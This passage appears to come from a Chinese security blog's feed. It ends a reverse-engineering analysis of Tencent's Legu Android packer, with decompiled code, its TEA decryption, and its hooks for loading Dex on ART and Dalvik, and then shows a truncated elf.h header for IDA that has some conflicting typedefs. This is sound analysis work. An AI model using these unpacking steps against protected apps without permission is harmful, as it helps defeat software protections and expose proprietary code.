class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v7 = a3 &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  v8 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &amp;&amp; a2 &amp;&amp; !(a3 &amp; <span class="number">7</span>) &amp;&amp; a4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)v8 ^= *(_DWORD *)(v6 + <span class="number">8</span> * (v7 &amp; <span class="number">1</span>));</span><br><span class="line">      *(_DWORD *)(v8 + <span class="number">4</span>) ^= *(_DWORD *)(v6 + <span class="number">8</span> * (v7 &amp; <span class="number">1</span>) + <span class="number">4</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 调用TEA解密函数</span></span><br><span class="line">      <span class="comment">// 参数：</span></span><br><span class="line">      <span class="comment">// arg1: 待解密的数据</span></span><br><span class="line">      <span class="comment">// arg2: key</span></span><br><span class="line">      <span class="comment">// arg3: 输出结果的缓冲区</span></span><br><span class="line">      <span class="comment">// arg4: 轮数</span></span><br><span class="line">      tea_decrypt(v6, v8, v8, v5);</span><br><span class="line">      v8 += <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>解压完成之后，将加载依赖的动态库，重定位，替换符号表value值，替换当前so的符号表、字符串表、哈希表，最后调用init_func和init_array的函数。</p>
<p>在整个解压以及修复完成后，获取解压后的真·JNI_Onload函数，在真·JNI_Onload中调用RegisterNatives注册Java的Native函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> JNINativeMethod v6[] = &#123;</span><br><span class="line">	&#123;<span class="string">"load"</span>,　<span class="string">"(Landroid/content/Context;)V"</span>,　(<span class="keyword">void</span>*)<span class="number">0xEF0CD745</span>&#125;,</span><br><span class="line">	&#123;<span class="string">"runCreate"</span>,　<span class="string">"(Landroid/content/Context;)V"</span>,　(<span class="keyword">void</span>*)<span class="number">0xEF0C9B2D</span>&#125;, </span><br><span class="line">	&#123;<span class="string">"changeEnv"</span>,　<span class="string">"(Landroid/content/Context;)V"</span>,　(<span class="keyword">void</span>*)<span class="number">0xEF0C8CC5</span>&#125;, </span><br><span class="line">	&#123;<span class="string">"reciver"</span>,　<span class="string">"(Landroid/content/Intent;)V"</span>,　(<span class="keyword">void</span>*)<span class="number">0xEF0C534D</span>&#125;, </span><br><span class="line">	&#123;<span class="string">"txEntries"</span>,　<span class="string">"(Ldalvik/system/DexFile;)Ljava/util/Enumeration;"</span>,　(<span class="keyword">void</span>*)<span class="number">0xEF0C8BD9</span>&#125;</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">  v7 = (*a1)-&gt;FindClass(a1, <span class="string">"com/tencent/StubShell/TxAppEntry"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (*v5)-&gt;RegisterNatives(v5, v7, v6, <span class="number">5</span>);</span><br><span class="line">    v7 = (jclass)<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      _android_log_print(<span class="number">3</span>, (<span class="keyword">int</span>)<span class="string">"SecShell"</span>, <span class="string">"register nativers error"</span>);</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="0x4-load的本地函数"><a href="#0x4-load的本地函数" class="headerlink" title="0x4 load的本地函数"></a>0x4 load的本地函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">com_tencent_StubShell_TxAppEntr_load</span><span class="params">(JNIEnv *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v3 = a1;</span><br><span class="line">  v4 = context;</span><br><span class="line">  v5 = hook_art_aoc();</span><br><span class="line">  v6 = j_j_j_getpid_0(v5);</span><br><span class="line">  _android_log_print(<span class="number">3</span>, (<span class="keyword">int</span>)<span class="string">"SecShell"</span>, <span class="string">"Start load %d"</span>, v6);</span><br><span class="line">  result = get_sdk_version(v3);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = is_art((<span class="keyword">int</span>)v3);</span><br><span class="line">    sub_EF0C53E4(v3);                           <span class="comment">// 设置com/tencent/StubShell/TxReceiver的TX_RECIEVER字段</span></span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">      result = art_load(v3, v4, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      result = dalvik_load(v3, v4, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在load的本地函数中，根据当前虚拟机实现来加载Dex.</p>
<p><br></p>
<h3 id="0x5-Art加载"><a href="#0x5-Art加载" class="headerlink" title="0x5 Art加载"></a>0x5 Art加载</h3><p>加载的思路简单的概括如下：</p>
<pre><code>1. 通过mCookie得到ShellDex的地址
2. 通过ShellDex的 data_size + data_off 得到原Dex的偏移（偏移相对于ShellDex的地址），并得到原Dex内存地址
3. 解密（TEA）原Dex后，在偏移0x20处得到整个原Dex大小
4. Hook mmap函数, 当加载ShellDex时，替换成原Dex解密后的内容
5. Hook fstat函数, 当加载ShellDex时，替换成原Dex的信息（重点是替换文件大小）
6. 调用DexFile.load函数，加载ShellDex
7. 如果有多个Dex，重复上面 2 - 6 步骤
8. 构造一个新的Elements数组，替换当前ClassLoader.pathList.dexElements
</code></pre><h3 id="0x6-Dalvik加载"><a href="#0x6-Dalvik加载" class="headerlink" title="0x6 Dalvik加载"></a>0x6 Dalvik加载</h3><p>加载的思路简单的概括如下：</p>
<pre><code>1.  获取mCookie
     1) 对于sdk大于10，通过ClassLoader.PathList.dexElements.dexFile获取mCookie
     2) 对于sdk小于10，通过ClassLoader.mDexs获取mCookie
2. 通过mCookie获取ShellDex的地址
3. 通过ShellDex的 data_size + data_off 得到原Dex的偏移（偏移相对于ShellDex的地址），并得到原Dex内存地址
4. 使用TEA解密原Dex
5. 加载mix.dex
6. 构造DexFile和DvmDex的实例，各个字段指向原Dex的信息
7. 用新的DexFile和DvmDex实例，替换mix.dex的mCookie的相应字段
8. 如果有多个Dex，根据当前原Dex的 data_size + data_off 获取下一个原Dex的偏移，然后重复上面 4 - 7 步骤
9. 将加载的Dex加入当前类加载器
    1) 对于sdk大于10，构造一个新的Elements数组，替换当前ClassLoader.pathList.dexElements
    2) 对于sdk小于10，分别构造mDexs、mPaths、mFiles、mZips，替换当前ClassLoader的相应字段
</code></pre><h3 id="0x7-附件"><a href="#0x7-附件" class="headerlink" title="0x7 附件"></a>0x7 附件</h3><p><a href="/files/Ctdu39b3zYrvOhJusVmX.idb" target="_blank">init_array解密.idb</a><br><a href="/files/xqZGFz0JIEVvEMd80jSH.idb" target="_blank">Fake_Jni_Onload解密.idb</a></p>
<h3 id="0x8-参考"><a href="#0x8-参考" class="headerlink" title="0x8 参考"></a>0x8 参考</h3><p><a href="http://bbs.pediy.com/thread-218782.htm" target="_blank" rel="noopener">[1] 乐固libshella 2.10.1分析笔记 </a> </p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x1-init-array-0-函数&quot;&gt;&lt;a href=&quot;#0x1-init-array-0-函数&quot; class=&quot;headerlink&quot; title=&quot;0x1 init_array[0]函数&quot;&gt;&lt;/a&gt;0x1 init_array[0]函数&lt;/h3&gt;&lt;p&gt;在第
    
    </summary>
    
    
      <category term="Android加固" scheme="http://www.ench4nt3r.com/tags/Android%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>elf.h in IDA</title>
    <link href="http://www.ench4nt3r.com/2017/07/09/elf-in-ida/"/>
    <id>http://www.ench4nt3r.com/2017/07/09/elf-in-ida/</id>
    <published>2017-07-09T06:51:15.000Z</published>
    <updated>2017-07-09T06:54:58.000Z</updated>
    
    <content type="html"><![CDATA[<p>可以直接在IDA导入的elf头文件<br><a id="more"></a></p>
<p>elf.h</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/****************************************************************************</span></span><br><span class="line"><span class="comment"> ****************************************************************************</span></span><br><span class="line"><span class="comment"> ***</span></span><br><span class="line"><span class="comment"> ***   This header was automatically generated from a Linux kernel header</span></span><br><span class="line"><span class="comment"> ***   of the same name, to make information necessary for userspace to</span></span><br><span class="line"><span class="comment"> ***   call into the kernel available to libc.  It contains only constants,</span></span><br><span class="line"><span class="comment"> ***   structures, and macros generated from the original header, and thus,</span></span><br><span class="line"><span class="comment"> ***   contains no copyrightable information.</span></span><br><span class="line"><span class="comment"> ***</span></span><br><span class="line"><span class="comment"> ***   To edit the content of this header, modify the corresponding</span></span><br><span class="line"><span class="comment"> ***   source file (e.g. under external/kernel-headers/original/) then</span></span><br><span class="line"><span class="comment"> ***   run bionic/libc/kernel/tools/update_all.py</span></span><br><span class="line"><span class="comment"> ***</span></span><br><span class="line"><span class="comment"> ***   Any manual change here will be lost the next time this script will</span></span><br><span class="line"><span class="comment"> ***   be run. You've been warned!</span></span><br><span class="line"><span class="comment"> ***</span></span><br><span class="line"><span class="comment"> ****************************************************************************</span></span><br><span class="line"><span class="comment"> ****************************************************************************/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _UAPI_LINUX_ELF_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _UAPI_LINUX_ELF_H</span></span><br><span class="line"><span class="comment">// #include &lt;linux/types.h&gt;</span></span><br><span class="line"><span class="comment">// #include &lt;linux/elf-em.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __signed__ signed </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __u64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> __u32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> __u16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __u64;</span><br><span class="line"><span class="keyword">typedef</span> __signed__ <span class="keyword">long</span> __u64;</span><br><span class="line"><span class="keyword">typedef</span> __signed__ <span class="keyword">int</span> __s32;</span><br><span class="line"><span class="keyword">typedef</span> __signed__ <span class="keyword">short</span> __s16; </span><br><span class="line"></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="keyword">typedef</span> __u32 Elf32_Addr;</span><br><span class="line"><span class="keyword">typedef</span> __u16 Elf32_Half;</span><br><span class="line"><span class="keyword">typedef</span> __u32 Elf32_Off;</span><br><span class="line"><span class="keyword">typedef</span> __s32 Elf32_Sword;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="keyword">typedef</span> __u32 Elf32_Word;</span><br><span class="line"><span class="keyword">typedef</span> __u64 Elf64_Addr;</span><br><span class="line"><span class="keyword">typedef</span> __u16 Elf64_Half;</span><br><span class="line"><span class="keyword">typedef</span> __s16 Elf64_SHalf;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="keyword">typedef</span> __u64 Elf64_Off;</span><br><span class="line"><span class="keyword">typedef</span> __s32 Elf64_Sword;</span><br><span class="line"><span class="keyword">typedef</span> __u32 Elf64_Word;</span><br><span class="line"><span class="keyword">typedef</span> __u64 Elf64_Xword;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="keyword">typedef</span> __s64 Elf64_Sxword;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_NULL 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_LOAD 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_DYNAMIC 2</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_INTERP 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_NOTE 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_SHLIB 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_PHDR 6</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_TLS 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_LOOS 0x60000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_HIOS 0x6fffffff</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_LOPROC 0x70000000</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_HIPROC 0x7fffffff</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_GNU_EH_FRAME 0x6474e550</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_GNU_STACK (PT_LOOS + 0x474e551)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PN_XNUM 0xffff</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ET_NONE 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ET_REL 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ET_EXEC 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ET_DYN 3</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ET_CORE 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ET_LOPROC 0xff00</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ET_HIPROC 0xffff</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_NULL 0</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_NEEDED 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PLTRELSZ 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PLTGOT 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_HASH 4</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_STRTAB 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SYMTAB 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELA 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELASZ 8</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELAENT 9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_STRSZ 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SYMENT 11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_INIT 12</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_FINI 13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SONAME 14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RPATH 15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SYMBOLIC 16</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_REL 17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELSZ 18</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELENT 19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PLTREL 20</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_DEBUG 21</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_TEXTREL 22</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_JMPREL 23</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_ENCODING 32</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OLD_DT_LOOS 0x60000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_LOOS 0x6000000d</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_HIOS 0x6ffff000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_VALRNGLO 0x6ffffd00</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_VALRNGHI 0x6ffffdff</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_ADDRRNGLO 0x6ffffe00</span></span><br><span class="line"><span class="meta">#<span 